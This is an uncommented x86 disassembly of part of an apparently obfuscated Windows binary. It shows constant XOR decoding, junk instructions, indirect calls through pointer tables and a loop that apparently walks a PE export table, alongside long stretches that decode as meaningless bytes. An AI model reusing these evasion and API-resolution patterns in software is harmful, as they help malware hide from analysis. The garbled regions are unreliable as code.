  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e7cc,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x4304d7,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ee59
  40cd16:	mov    eax,ds:0x43047d
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42edd7
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x43046d,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x4304e7,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e7c0,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x430471,0x42edcf
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x430439,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x43043d,0x430449
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42edcb
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x430449,0x0
  40cde2:	mov    eax,ds:0x430449
  40cde7:	inc    eax
  40cde8:	mov    ds:0x430449,eax
  40cded:	cmp    DWORD PTR ds:0x430449,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42eacf
  40ce06:	cmp    DWORD PTR ds:0x430449,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42edd7,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x4304cf,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ede3,0x4304df
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e7cc,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x43043d,0x17
  40ce7c:	cmp    DWORD PTR ds:0x43043d,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x43043d,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e7dc
  40cec0:	push   0x42e8e3
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42ec43
  40ced0:	cmp    DWORD PTR ds:0x43043d,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x43043d
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x43043d,edi
  40ceea:	mov    edi,DWORD PTR ds:0x43043d
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x43043d,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e7d4,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e7d4,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e7d4,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x43044d
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42ec47
  40cf36:	cmp    DWORD PTR ds:0x42e7d4,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42edef,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e7c4
  40cf7a:	sbb    DWORD PTR ds:0x430435,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x4304db,0x1f
  40cf95:	cmp    DWORD PTR ds:0x4304db,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x4304db,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42eddb
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42ea0f
  40cfbd:	cmp    DWORD PTR ds:0x4304db,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x4304db
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x4304db,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x4304db
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x4304db,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42edf3,0x11
  40cff9:	cmp    DWORD PTR ds:0x42edf3,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42edf3,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e7d8
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42ec4b
  40d024:	cmp    DWORD PTR ds:0x42edf3,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42edf3
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42edf3,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42edf3
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42edf3,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x430439,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x430439
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x430439,esi
  40d067:	cmp    DWORD PTR ds:0x430439,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42ea13
  40d087:	cmp    DWORD PTR ds:0x430439,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42eddb
  40d09f:	sub    DWORD PTR ds:0x42e7bc,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42eddf
  40d0b2:	xor    DWORD PTR ds:0x42ede7,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e7d4
  40d0c3:	or     DWORD PTR ds:0x430441,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42edf3
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x43044d,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42eddb,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x4304eb
  40d0ed:	xor    DWORD PTR ds:0x42eddf,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42edd7,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42edcf
  40d10b:	or     DWORD PTR ds:0x42eddb,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [ecx+eiz*8],esp
  40d124:	scas   al,BYTE PTR es:[edi]
  40d125:	cmp    bh,cl
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	(bad)
  40d131:	mov    cl,0xbb
  40d133:	push   esp
  40d134:	sbb    BYTE PTR [esp+ecx*1+0x57],cl
  40d138:	jle    0x40d124
  40d13a:	mov    al,0xc7
  40d13c:	test   BYTE PTR [ebp+0x3c],cl
  40d13f:	push   edx
  40d140:	jmp    0x40d117
  40d142:	push   0xffffffc6
  40d144:	stos   BYTE PTR es:[edi],al
  40d145:	fmul   st(3),st
  40d147:	dec    ebx
  40d148:	adc    dh,BYTE PTR [edx+0x5d]
  40d14b:	cmc    
  40d14c:	pushf  
  40d14d:	ins    BYTE PTR es:[edi],dx
  40d14e:	cmp    DWORD PTR [edi],ebp
  40d150:	mov    BYTE PTR [edi],al
  40d152:	pop    eax
  40d153:	cmp    al,0xb0
  40d155:	jo     0x40d143
  40d157:	adc    eax,0xb2aff380
  40d15c:	loope  0x40d1b1
  40d15e:	rol    DWORD PTR [ecx-0x5],0x67
  40d162:	mov    eax,ds:0x2005eb34
  40d167:	loop   0x40d0f5
  40d169:	dec    ebp
  40d16a:	pusha  
  40d16b:	jbe    0x40d135
  40d16d:	sbb    bh,0xfa
  40d170:	dec    ecx
  40d171:	iret   
  40d172:	jb     0x40d142
  40d174:	pop    ds
  40d175:	add    al,0xd5
  40d177:	jnp    0x40d17b
  40d179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d17a:	sub    dl,bl
  40d17c:	cmovbe esp,DWORD PTR ds:0x89dec046
  40d183:	mov    ds:0x2d074630,al
  40d188:	mov    al,0xa5
  40d18a:	push   ebx
  40d18b:	(bad)  
  40d18c:	sahf   
  40d18d:	add    esp,esp
  40d18f:	retf   0xc937
  40d192:	ins    BYTE PTR es:[edi],dx
  40d193:	dec    ebp
  40d194:	aam    0x7b
  40d196:	sbb    ecx,edx
  40d198:	xor    cl,cl
  40d19a:	fldenv [edi-0x6b]
  40d19d:	add    dl,BYTE PTR [eax+0x73effeaf]
  40d1a3:	sbb    dh,bl
  40d1a5:	jbe    0x40d147
  40d1a7:	mov    ebx,0x17027426
  40d1ac:	fild   QWORD PTR [esi]
  40d1ae:	add    DWORD PTR [esi-0x6a],0x8c346cde
  40d1b5:	jecxz  0x40d1f6
  40d1b7:	retf   
  40d1b8:	xor    al,0x23
  40d1ba:	sub    eax,0x21cbe1dd
  40d1bf:	and    DWORD PTR [ebp-0x44],0xffffffcd
  40d1c3:	ins    BYTE PTR es:[edi],dx
  40d1c4:	mov    WORD PTR [edi],gs
  40d1c6:	outs   dx,BYTE PTR ds:[esi]
  40d1c7:	xlat   BYTE PTR ds:[ebx]
  40d1c8:	fisubr DWORD PTR [ecx+0x3c]
  40d1cb:	pop    ss
  40d1cc:	mov    BYTE PTR [ebx-0x18107976],cl
  40d1d2:	pop    ecx
  40d1d3:	(bad)  
  40d1d4:	aaa    
  40d1d5:	sahf   
  40d1d6:	shl    DWORD PTR [ebx],0x98
  40d1d9:	dec    eax
  40d1da:	jmp    0x3859:0xc8b91786
  40d1e1:	adc    ah,BYTE PTR [ebx]
  40d1e3:	pop    eax
  40d1e4:	jne    0x40d193
  40d1e6:	pop    eax
  40d1e7:	and    BYTE PTR [edi-0x4b],ch
  40d1ea:	xchg   DWORD PTR [eax-0x37cafd42],esi
  40d1f0:	(bad)  
  40d1f2:	adc    eax,0x6d6440b6
  40d1f7:	xor    DWORD PTR [edi],0xffffffb9
  40d1fa:	aad    0x1a
  40d1fc:	and    esp,ecx
  40d1fe:	push   es
  40d1ff:	rcr    DWORD PTR [edi],cl
  40d201:	data16 aas 
  40d203:	scas   al,BYTE PTR es:[edi]
  40d204:	pop    ss
  40d205:	push   0xb6bf77b4
  40d20a:	xchg   DWORD PTR [ebx+ebx*2],edi
  40d20d:	push   esp
  40d20e:	mov    esp,0x9133170b
  40d213:	push   0xffffff83
  40d215:	(bad)  
  40d216:	out    0xff,al
  40d218:	lock push DWORD PTR [ebx]
  40d21b:	pop    esp
  40d21c:	aaa    
  40d21d:	int3   
  40d21e:	and    ch,BYTE PTR [esi+0xc540c5d]
  40d224:	jmp    0x4bd2:0xda10978
  40d22b:	add    eax,DWORD PTR [ebx]
  40d22d:	sbb    edx,DWORD PTR [ecx-0x66b513b2]
  40d233:	sbb    DWORD PTR [edi],edx
  40d235:	test   DWORD PTR ds:0xadae6c,ebx
  40d23b:	xchg   ebp,eax
  40d23c:	pushf  
  40d23d:	mov    dh,0xe1
  40d23f:	adc    al,BYTE PTR [ebx+eax*8-0x3106301d]
  40d246:	mov    al,ds:0xf2a8cd4
  40d24b:	ds pop esp
  40d24d:	mov    ds:0xa06ac19a,al
  40d252:	adc    eax,0xfb83ae3e
  40d257:	xchg   edi,eax
  40d258:	dec    ebx
  40d259:	int    0x3
  40d25b:	retf   
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x4304e7
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ede7,0x42e7c4
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42edef,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42eddf,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42edd7,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x430439,0x430445
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x4304df
  40d2bf:	add    DWORD PTR ds:0x42edd7,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e96f
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x430465,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x43045d,0x42edd3
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e7c4,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x430449,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x430465,0x43043d
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e7c4,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42edeb,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x430449,0x4304d3
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x430435,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x43044d,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x430461,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x43045d,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x43045d
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x43045d,ecx
  40d38d:	cmp    DWORD PTR ds:0x43045d,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x430441
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42ead3
  40d3b2:	cmp    DWORD PTR ds:0x43045d,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x96a8e30
  40d410:	pop    ss
  40d411:	js     0x40d40c
  40d413:	lods   eax,DWORD PTR ds:[esi]
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d498
  40d41c:	add    ah,BYTE PTR [edx+ecx*4]
  40d41f:	lods   al,BYTE PTR ds:[esi]
  40d420:	pop    eax
  40d421:	sbb    ch,BYTE PTR [esi-0x33118b28]
  40d427:	stos   DWORD PTR es:[edi],eax
  40d428:	call   0x37de:0xcf760124
  40d42f:	ret    
  40d430:	nop
  40d431:	jp     0x40d3f1
  40d433:	or     al,0x55
  40d435:	and    cl,BYTE PTR [edi-0x6b97fed8]
  40d43b:	leave  
  40d43c:	loope  0x40d472
  40d43e:	cmp    al,0x79
  40d440:	(bad)  
  40d441:	fsub   st(4),st
  40d443:	jg     0x40d481
  40d445:	fild   DWORD PTR [eax-0x53815cc3]
  40d44b:	mov    edi,0x15b85340
  40d450:	mov    ah,0x54
  40d452:	and    DWORD PTR [esi],ecx
  40d454:	cmp    cl,bh
  40d456:	lods   eax,DWORD PTR ds:[esi]
  40d457:	push   ebp
  40d458:	test   BYTE PTR [eax],0x53
  40d45b:	jo     0x40d3e0
  40d45d:	pand   mm0,mm1
  40d460:	xchg   esi,eax
  40d461:	jmp    0x40d415
  40d463:	or     DWORD PTR [edi],ebp
  40d465:	xor    DWORD PTR [edi-0x6b],0x3a472806
  40d46c:	and    BYTE PTR [edx],cl
  40d46e:	andnps xmm4,xmm2
  40d471:	sbb    al,0xfe
  40d473:	adc    eax,0x9e1c8b41
  40d478:	repz call 0x2a53df1
  40d47e:	adc    eax,0x761c8918
  40d483:	inc    ebp
  40d484:	ins    DWORD PTR es:[edi],dx
  40d485:	sbb    ah,BYTE PTR [ecx+eiz*4+0x737345aa]
  40d48c:	xchg   esp,eax
  40d48d:	dec    ebp
  40d48e:	push   eax
  40d48f:	lods   al,BYTE PTR ds:[esi]
  40d490:	mov    DWORD PTR [ecx-0x4e],esi
  40d493:	and    eax,DWORD PTR [ebp-0x3f]
  40d496:	loop   0x40d4f2
  40d498:	rcr    BYTE PTR [ebx-0x71c86c55],cl
  40d49e:	cmp    BYTE PTR [edi],0x7e
  40d4a1:	test   al,0x70
  40d4a3:	jae    0x40d470
  40d4a5:	pop    ss
  40d4a6:	adc    DWORD PTR [edx],edi
  40d4a8:	outs   dx,DWORD PTR ds:[esi]
  40d4a9:	lods   eax,DWORD PTR ds:[esi]
  40d4aa:	ret    
  40d4ab:	or     cl,0x53
  40d4ae:	adc    eax,0xbd010a49
  40d4b3:	mov    ecx,0x2291b3e
  40d4b8:	in     al,0xc0
  40d4ba:	jmp    0x40d4cb
  40d4bc:	retf   
  40d4bd:	loope  0x40d499
  40d4bf:	cli    
  40d4c0:	in     al,0x59
  40d4c2:	out    0x9c,eax
  40d4c4:	xor    ecx,DWORD PTR [ebx]
  40d4c6:	stos   DWORD PTR es:[edi],eax
  40d4c7:	ss sub bh,dh
  40d4ca:	shr    DWORD PTR [esi-0x5dbd3109],cl
  40d4d0:	cdq    
  40d4d1:	cmc    
  40d4d2:	fsubrp st(5),st
  40d4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d5:	lods   eax,DWORD PTR ds:[esi]
  40d4d6:	loopne 0x40d4da
  40d4d8:	add    al,0x6
  40d4da:	xchg   ebp,eax
  40d4db:	xchg   edx,eax
  40d4dc:	and    eax,0xfc5f6b3
  40d4e1:	xchg   DWORD PTR [ecx+ebx*4],esp
  40d4e4:	cmp    BYTE PTR [esp+eiz*2-0xcb7fd83],ch
  40d4eb:	push   edi
  40d4ec:	inc    esi
  40d4ed:	outs   dx,DWORD PTR ds:[esi]
  40d4ee:	stos   BYTE PTR es:[edi],al
  40d4ef:	and    al,BYTE PTR [eax]
  40d4f1:	dec    esi
  40d4f2:	xchg   esp,eax
  40d4f3:	leave  
  40d4f4:	test   eax,0xe1a63de3
  40d4f9:	mov    bh,0x9d
  40d4fb:	out    0x27,eax
  40d4fd:	(bad)  
  40d4fe:	fild   WORD PTR [ecx-0x2a]
  40d501:	test   esi,edx
  40d503:	push   ss
  40d504:	jecxz  0x40d522
  40d506:	das    
  40d507:	bound  ebx,QWORD PTR [ecx+0x75]
  40d50a:	jmp    0x40d4e3
  40d50c:	or     dl,BYTE PTR [esi-0x9f7551]
  40d512:	icebp  
  40d513:	data16 jo 0x40d4ad
  40d516:	xor    DWORD PTR [esi+0x39425c7c],ebx
  40d51c:	dec    esp
  40d51d:	mov    esi,0x375f92c5
  40d522:	lods   al,BYTE PTR ds:[esi]
  40d523:	loope  0x40d58b
  40d525:	es cmp bh,dl
  40d528:	jmp    0x40d4de
  40d52a:	stos   DWORD PTR es:[edi],eax
  40d52b:	(bad)  
  40d52c:	aas    
  40d52d:	or     BYTE PTR [ecx+0xb116f37],bl
  40d533:	dec    edi
  40d534:	inc    ebp
  40d535:	lea    esp,[esi+0xb6266ee]
  40d53b:	xchg   BYTE PTR [ebx+ebx*1+0x2a],cl
  40d53f:	fsub   QWORD PTR [esi+0x5c]
  40d542:	into   
  40d543:	lds    ebp,FWORD PTR [edi+0x75ff12ef]
  40d549:	or     al,0xe8
  40d54b:	sbb    DWORD PTR [ecx-0x1],ebx
  40d54e:	dec    DWORD PTR [ebx+0x4d8bfc45]
  40d554:	clc    
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	jne    0x40d564
  40d5b9:	push   ebp
  40d5ba:	xor    DWORD PTR [ecx-0x71],edx
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d548
  40d5c4:	adc    DWORD PTR [ebp+0x785d8b40],ebx
  40d5ca:	and    edx,DWORD PTR [edx+0x779069f3]
  40d5d0:	jnp    0x40d564
  40d5d2:	pop    esp
  40d5d3:	xor    ecx,DWORD PTR [esi+0x274f0c21]
  40d5d9:	ret    
  40d5da:	fwait
  40d5db:	loope  0x40d567
  40d5dd:	scas   eax,DWORD PTR es:[edi]
  40d5de:	dec    ebx
  40d5df:	mov    bl,0x14
  40d5e1:	in     eax,0xc6
  40d5e3:	pop    es
  40d5e4:	arpl   sp,sp
  40d5e6:	out    dx,al
  40d5e7:	mov    bh,0x21
  40d5e9:	sub    BYTE PTR [edx],bl
  40d5eb:	mov    eax,0x96cb553a
  40d5f0:	fstp   st(2)
  40d5f2:	stos   BYTE PTR es:[edi],al
  40d5f3:	inc    eax
  40d5f4:	das    
  40d5f5:	ins    BYTE PTR es:[edi],dx
  40d5f6:	and    edi,DWORD PTR [edx+0x299c0cf1]
  40d5fc:	(bad)  
  40d5fd:	sar    DWORD PTR [ebx-0x5f],1
  40d600:	cli    
  40d601:	adc    DWORD PTR [esi+ecx*4],edx
  40d604:	xchg   esi,eax
  40d605:	ret    
  40d606:	push   ebx
  40d607:	dec    edi
  40d608:	daa    
  40d609:	jb     0x40d618
  40d60b:	mov    al,bh
  40d60d:	and    esp,ecx
  40d60f:	push   ecx
  40d610:	retf   
  40d611:	rcr    DWORD PTR [eax+0x7196b150],cl
  40d617:	sub    DWORD PTR [ebx+0x12],0xc3045199
  40d61e:	mov    al,0xd3
  40d620:	pop    DWORD PTR [ecx]
  40d622:	loopne 0x40d61d
  40d624:	call   0xa26c:0x3a6b921
  40d62b:	enter  0x5eef,0x69
  40d62f:	cmp    ebx,DWORD PTR [ebx+eiz*1]
  40d632:	or     BYTE PTR [esi],bl
  40d634:	and    bh,ah
  40d636:	stc    
  40d637:	mov    ds:0x6697eedb,al
  40d63c:	imul   ebx,DWORD PTR [esi],0xffffff8a
  40d63f:	xchg   esi,eax
